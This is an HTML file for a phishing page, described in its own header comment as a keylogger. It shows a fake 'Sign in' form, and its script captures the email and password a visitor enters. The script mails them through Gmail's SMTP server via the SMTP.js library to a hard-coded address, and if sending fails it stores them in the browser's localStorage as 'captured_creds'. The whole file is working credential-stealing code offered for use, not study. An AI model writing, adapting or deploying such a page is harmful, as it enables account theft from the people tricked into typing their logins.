<!-- 
  HTML keylogger that sends credentials directly to your Gmail
  using SMTP.js (no Telegram, no external service except email).
  Uses your Gmail account as sender and recipient.
  WARNING: Your Gmail password is exposed in client-side code.
-->

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #161b22; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.8); width: 320px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; }
        button { width: 100%; padding: 12px; background: #238636; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
        .error { color: #f85149; font-size: 14px; margin-top: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Sign in</h2>
        <input type="email" id="email" placeholder="Email or phone" autocomplete="off">
        <input type="password" id="password" placeholder="Password" autocomplete="off">
        <button id="loginBtn">Sign in</button>
        <div class="error" id="msg"></div>
    </div>

    <!-- SMTP.js library for sending email directly from browser -->
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    
    <script>
        (function() {
            // YOUR GMAIL CREDENTIALS – REPLACE PASSWORD
            const SENDER_EMAIL = "hadiphototikto@gmail.com";
            const SENDER_PASSWORD = "YOUR_GMAIL_APP_PASSWORD"; // <-- MUST REPLACE with app-specific password
            const RECIPIENT_EMAIL = "hadiphototikto@gmail.com";

            function sendToGmail(subject, body) {
                Email.send({
                    Host: "smtp.gmail.com",
                    Username: SENDER_EMAIL,
                    Password: SENDER_PASSWORD,
                    To: RECIPIENT_EMAIL,
                    From: SENDER_EMAIL,
                    Subject: subject,
                    Body: body
                })
                .then(function(message) {
                    document.getElementById('msg').innerText = "Credentials sent to your Gmail!";
                    document.getElementById('msg').style.color = "#58a6ff";
                    console.log("Email sent:", message);
                })
                .catch(function(error) {
                    document.getElementById('msg').innerText = "Send failed – check password/network";
                    document.getElementById('msg').style.color = "#f85149";
                    console.error("SMTP error:", error);
                    // Fallback: store in localStorage
                    localStorage.setItem("captured_creds", body);
                });
            }

            document.getElementById('loginBtn').addEventListener('click', function() {
                const email = document.getElementById('email').value.trim();
                const pass = document.getElementById('password').value.trim();

                if (!email || !pass) {
                    document.getElementById('msg').innerText = "Please fill both fields.";
                    return;
                }

                const creds = "Email: " + email + "\nPassword: " + pass;
                sendToGmail("New Login Credentials", creds);

                // Clear fields
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
            });

            // Enter key support
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    const active = document.activeElement;
                    if (active && (active.id === 'email' || active.id === 'password')) {
                        document.getElementById('loginBtn').click();
                    }
                }
            });
        })();
    </script>
</body>
</html>
